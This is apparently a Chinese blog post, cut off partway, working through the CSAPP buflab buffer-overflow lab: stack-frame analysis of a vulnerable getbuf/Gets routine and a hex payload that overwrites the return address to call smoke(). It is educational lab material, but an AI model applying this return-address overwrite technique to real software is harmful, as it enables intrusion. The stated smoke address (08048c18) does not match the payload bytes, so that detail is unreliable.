@@ -1,0 +1,962 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/image/atom1.png">
+  <link rel="icon" href="/image/atom1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#153b6e">
+  <meta name="author" content="郭佳明">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="实验环境 根据实验手册操作  解压 1tar xvf buflab-handout.tar 得到三个文件  bufbomb  二进制炸弹 -h选项打印帮助信息 -u userid 运行，userid会改变一些代码地址   makecookie  根据id定制cookie   hex2raw 将十六进制数字转化为对应的ASCII码     set disassembly-flavor att 转换为">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP-lab3：buflab">
+<meta property="og:url" content="http://gls.show/p/db3828d1/index.html">
+<meta property="og:site_name" content="郭佳明的博客">
+<meta property="og:description" content="实验环境 根据实验手册操作  解压 1tar xvf buflab-handout.tar 得到三个文件  bufbomb  二进制炸弹 -h选项打印帮助信息 -u userid 运行，userid会改变一些代码地址   makecookie  根据id定制cookie   hex2raw 将十六进制数字转化为对应的ASCII码     set disassembly-flavor att 转换为">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://gls.show/image/csapp1.png">
+<meta property="article:published_time" content="2024-01-31T05:08:35.000Z">
+<meta property="article:modified_time" content="2024-02-01T09:30:59.291Z">
+<meta property="article:author" content="郭佳明">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://gls.show/image/csapp1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>CSAPP-lab3：buflab - 郭佳明的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"gls.show","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>郭佳明的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/mountain1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CSAPP-lab3：buflab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-31 13:08" pubdate>
+          2024年1月31日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          36 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CSAPP-lab3：buflab</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2024年2月1日 下午
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><blockquote>
+<p>根据实验手册操作</p>
+</blockquote>
+<p>解压</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar xvf buflab-handout.tar<br></code></pre></td></tr></table></figure>
+<p>得到三个文件</p>
+<ul>
+<li>bufbomb <ul>
+<li>二进制炸弹</li>
+<li>-h选项打印帮助信息</li>
+<li>-u userid 运行，userid会改变一些代码地址</li>
+</ul>
+</li>
+<li>makecookie <ul>
+<li>根据id定制cookie</li>
+</ul>
+</li>
+<li>hex2raw<ul>
+<li>将十六进制数字转化为对应的ASCII码</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>set disassembly-flavor att 转换为att格式的汇编</p>
+</blockquote>
+<h1 id="程序的基本分析"><a href="#程序的基本分析" class="headerlink" title="程序的基本分析"></a>程序的基本分析</h1><p>程序的运行方法：</p>
+<p>Usage: ./bufbomb -u <code>&lt;userid&gt;</code> [-nsh]<br>  -u <code>&lt;userid&gt;</code> User ID<br>  -n          Nitro mode<br>  -s          Submit your solution to the grading server<br>  -h          Print help information</p>
+<p>看一下保护</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; checksec<br>[*] <span class="hljs-string">&#x27;/home/kali/Desktop/bufbomb&#x27;</span><br>    Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      <span class="hljs-function">No <span class="hljs-title">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span></span><br><span class="hljs-function">    FORTIFY:  Enabled</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure>
+
+
+<ul>
+<li>“No PIE (0x8048000)”，这表示程序是以固定的基址加载到内存中的。地址0x8048000是程序的加载基址，也就是程序在内存中的起始地址。这意味着程序在每次运行时都会以相同的地址加载到内存中，而不是以随机的基址进行地址重定位。</li>
+</ul>
+<p>程序行为：</p>
+<ul>
+<li>BUFBOMB程序通过以下函数从标准输入中读取字符串<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-comment">/* Buffer size for getbuf */</span><br><span class="hljs-number">2</span> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span><br><span class="hljs-number">3</span><br><span class="hljs-number">4</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getbuf</span><span class="hljs-params">()</span></span><br><span class="hljs-function">5 </span>&#123;<br><span class="hljs-number">6</span>  <span class="hljs-keyword">char</span> buf[NORMAL_BUFFER_SIZE];<br><span class="hljs-number">7</span>  Gets(buf);<br><span class="hljs-number">8</span>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-number">9</span> &#125;<br></code></pre></td></tr></table></figure></li>
+<li>此处存在缓冲区溢出</li>
+</ul>
+<p>If the string  is no more than 31 characters long, it is clear that getbuf will return 1, as shown by the following execution example:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">unix&gt; ./bufbomb -u bovik<br>Type <span class="hljs-built_in">string</span>: I love <span class="hljs-number">15</span><span class="hljs-number">-213.</span><br>Dud: getbuf returned <span class="hljs-number">0x1</span><br></code></pre></td></tr></table></figure>
+
+<p>An error occurs if we type a longer string:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">unix&gt; ./bufbomb -u bovik<br>Type <span class="hljs-built_in">string</span>: It is easier to love <span class="hljs-keyword">this</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">when</span> <span class="hljs-title">you</span> <span class="hljs-title">are</span> <span class="hljs-title">a</span> <span class="hljs-title">TA</span>.</span><br><span class="hljs-class"><span class="hljs-title">Ouch</span>!:</span> You caused a segmentation fault!<br></code></pre></td></tr></table></figure>
+
+<p>由于我们输入的字符串可能有不可见字符，TA贴心的提供了HEX2RAW帮你生成这类字符串。HEX2RAW程序的输入是很多个由两个16进制数字组成的字节</p>
+<p>“012345” could be entered in hex format as “30 31 32 33 34 35.” (Recall that the ASCII code for decimal digit x is 0x3x.)</p>
+<p>假设我们输入了：bf 66 7b 32 78，那么与之对应的：</p>
+<p><strong>Raw Hex</strong> (zero bytes in bold):</p>
+<p>BF667B3278   </p>
+<p><strong>String Literal:</strong></p>
+<p>“\xBF\x66\x7B\x32\x78”</p>
+<p><strong>Array Literal:</strong></p>
+<p>{ 0xBF, 0x66, 0x7B, 0x32, 0x78 }</p>
+<p>Disassembly:</p>
+<p>0:  bf 66 7b 32 78          mov    edi,0x78327b66</p>
+<p>我们需要将此写在exploit.txt中，然后使用如下命令与bufbomb交互</p>
+<ul>
+<li>1、重定向程序输入</li>
+<li>2、在gdb中给程序加参数</li>
+</ul>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1.</span> You can <span class="hljs-built_in">set</span> up <span class="hljs-keyword">a</span> series <span class="hljs-keyword">of</span> pipes <span class="hljs-built_in">to</span> pass <span class="hljs-keyword">the</span> <span class="hljs-keyword">string</span> through HEX2RAW.<br><br>unix&gt; cat exploit.txt | ./hex2raw | ./bufbomb -u bovik<br><br><span class="hljs-number">2.</span> You can store <span class="hljs-keyword">the</span> raw <span class="hljs-keyword">string</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">and</span> use I/O redirection <span class="hljs-built_in">to</span> supply <span class="hljs-keyword">it</span> <span class="hljs-built_in">to</span> BUFBOMB:<br><br>unix&gt; ./hex2raw &lt; exploit.txt &gt; exploit-raw.txt<br>unix&gt; ./bufbomb -u bovik &lt; exploit-raw.txt<br>This approach can also be used when running BUFBOMB <span class="hljs-built_in">from</span> <span class="hljs-keyword">within</span> GDB:<br>unix&gt; gdb bufbomb<br>(gdb) run -u bovik &lt; exploit-raw.txt<br></code></pre></td></tr></table></figure>
+
+
+<h1 id="level-0-Candle（10-pts）"><a href="#level-0-Candle（10-pts）" class="headerlink" title="level 0 Candle（10 pts）"></a>level 0 Candle（10 pts）</h1><p>test函数会调用getbuf函数，getbuf函数执行完之后会返回到test中继续执行。getbuf函数具有缓冲区溢出漏洞，我们需要劫持函数执行流，使得从getbuf函数返回到我们想要的smoke函数处</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Buffer size for getbuf */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span><br><br> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getbuf</span><span class="hljs-params">()</span></span><br><span class="hljs-function"> </span>&#123;<br>    <span class="hljs-keyword">char</span> buf[NORMAL_BUFFER_SIZE];<br>    Gets(buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br> &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-comment">/* Put canary on stack to detect possible corruption */</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> local = uniqueval();<br><br>    val = getbuf();<br><br>    <span class="hljs-comment">/* Check for corrupted stack */</span><br>    <span class="hljs-keyword">if</span> (local != uniqueval()) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);<br>        validate(<span class="hljs-number">3</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">smoke</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Smoke!: You called smoke()\n&quot;</span>);<br>    validate(<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>smoke函数的地址为08048c18，因此需要将返回地址覆盖写为08048c18</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">disas</span> smoke<br><br><span class="hljs-attribute">08048c18</span> &lt;smoke&gt;:<br> <span class="hljs-attribute">8048c18</span>:	<span class="hljs-number">55</span>                   	push   %ebp<br> <span class="hljs-attribute">8048c19</span>:	<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                	mov    %esp,%ebp<br> <span class="hljs-attribute">8048c1b</span>:	<span class="hljs-number">83</span> ec <span class="hljs-number">18</span>             	sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%esp<br> <span class="hljs-attribute">8048c1e</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> d<span class="hljs-number">3</span> a<span class="hljs-number">4</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">4</span>d<span class="hljs-number">3</span>,(%esp)<br> <span class="hljs-attribute">8048c25</span>:	e<span class="hljs-number">8</span> <span class="hljs-number">96</span> fc ff ff       	call   <span class="hljs-number">80488</span>c<span class="hljs-number">0</span> &lt;puts@plt&gt;<br> <span class="hljs-attribute">8048c2a</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,(%esp)<br> <span class="hljs-attribute">8048c31</span>:	e<span class="hljs-number">8</span> <span class="hljs-number">45</span> <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	call   <span class="hljs-number">804937</span>b &lt;validate&gt;<br> <span class="hljs-attribute">8048c36</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,(%esp)<br> <span class="hljs-attribute">8048c3d</span>:	e<span class="hljs-number">8</span> be fc ff ff       	call   <span class="hljs-number">8048900</span> &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure>
+
+<p>getbuf函数的栈帧分配了0x38字节，buf的首地址在0x28偏移处，因此需要填充buf+old ebp大小的空间，然后将返回地址覆盖</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">080491f4</span> &lt;getbuf&gt;:<br> <span class="hljs-attribute">80491f4</span>:	<span class="hljs-number">55</span>                   	push   %ebp<br> <span class="hljs-attribute">80491f5</span>:	<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                	mov    %esp,%ebp<br> <span class="hljs-attribute">80491f7</span>:	<span class="hljs-number">83</span> ec <span class="hljs-number">38</span>             	sub    $<span class="hljs-number">0</span>x<span class="hljs-number">38</span>,%esp <br> <span class="hljs-attribute">80491fa</span>:	<span class="hljs-number">8</span>d <span class="hljs-number">45</span> d<span class="hljs-number">8</span>             	lea    -<span class="hljs-number">0</span>x<span class="hljs-number">28</span>(%ebp),%eax<br> <span class="hljs-attribute">80491fd</span>:	<span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>             	mov    %eax,(%esp)<br> <span class="hljs-attribute">8049200</span>:	e<span class="hljs-number">8</span> f<span class="hljs-number">5</span> fa ff ff       	call   <span class="hljs-number">8048</span>cfa &lt;Gets&gt;<br> <span class="hljs-attribute">8049205</span>:	b<span class="hljs-number">8</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	mov    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax<br> <span class="hljs-attribute">804920a</span>:	c<span class="hljs-number">9</span>                   	leave  <br> <span class="hljs-attribute">804920b</span>:	c<span class="hljs-number">3</span>                   	ret    <br><br></code></pre></td></tr></table></figure>
+<p>栈帧结构图</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br><br> high         ┌───────────┐<br>              │           │<br>              │   cookie  │<br>              ├───────────┤<br>              │           │<br>              │           │<br>              ├───────────┤<br>              │           │<br>              │return <span class="hljs-keyword">addr│</span><br><span class="hljs-keyword"></span>              │           │<br>              ├───────────┤<br>              │           │<br>ebp  ─────►   │ old ebp   │<br>              │           │<br>              ├───────────┤<br>              │           │<br>              │           │<br>              │   <span class="hljs-keyword">buf </span>    │<br>              │           │<br>              │           │<br>              │           │<br>              │           │<br>              │           │<br>              ├───────────┤<br>              │           │<br>              │ ...<span class="hljs-keyword">buf[0] </span>│<br>              └───────────┘<br> low<br><br></code></pre></td></tr></table></figure>
+
+<p>exploit.txt</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">50 </span><span class="hljs-number">8</span>b <span class="hljs-number">04</span> <span class="hljs-number">08</span> /*小端序*/<br></code></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat exploit.txt | ./hex2raw  | ./bufbomb -u nmsl<br><br>Userid: nmsl<br>Cookie: 0x6185560e<br>Type string:Smoke!: You called smoke()<br>VALID<br>NICE JOB!<br></code></pre></td></tr></table></figure>
+
+<h1 id="level-1-Sparkler（10-pts）"><a href="#level-1-Sparkler（10-pts）" class="headerlink" title="level 1 Sparkler（10 pts）"></a>level 1 Sparkler（10 pts）</h1><p>执行fizz函数，且该函数有一个参数，也即是在level 0的基础上加了一个函数参数</p>
+<p>我的cookie：0x6185560e</p>
+<p>反汇编得到fizz的地址：08048c42</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">disas</span> fizz<br><br><span class="hljs-attribute">08048c42</span> &lt;fizz&gt;:<br> <span class="hljs-attribute">8048c42</span>:	<span class="hljs-number">55</span>                   	push   %ebp<br> <span class="hljs-attribute">8048c43</span>:	<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                	mov    %esp,%ebp<br> <span class="hljs-attribute">8048c45</span>:	<span class="hljs-number">83</span> ec <span class="hljs-number">18</span>             	sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%esp<br> <span class="hljs-attribute">8048c48</span>:	<span class="hljs-number">8</span>b <span class="hljs-number">45</span> <span class="hljs-number">08</span>             	mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%ebp),%eax<br> <span class="hljs-attribute">8048c4b</span>:	<span class="hljs-number">3</span>b <span class="hljs-number">05</span> <span class="hljs-number">08</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span>    	cmp    <span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">108</span>,%eax<br> <span class="hljs-attribute">8048c51</span>:	<span class="hljs-number">75</span> <span class="hljs-number">26</span>                	jne    <span class="hljs-number">8048</span>c<span class="hljs-number">79</span> &lt;fizz+<span class="hljs-number">0</span>x<span class="hljs-number">37</span>&gt;<br> <span class="hljs-attribute">8048c53</span>:	<span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          	mov    %eax,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span 